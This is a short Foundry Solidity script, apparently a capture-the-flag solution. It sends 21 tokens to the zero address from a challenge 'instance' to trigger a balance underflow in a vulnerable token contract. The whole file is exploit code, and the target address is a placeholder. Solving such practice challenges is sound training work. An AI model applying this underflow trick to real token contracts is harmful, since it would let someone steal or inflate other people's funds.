// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    address victim = /* Your instance address */;

    function run() public {
        vm.startBroadcast();
        (bool success, ) = victim.call(
            abi.encodeWithSignature("transfer(address,uint256)", address(0), 21)
        );
        vm.stopBroadcast();
    }
}
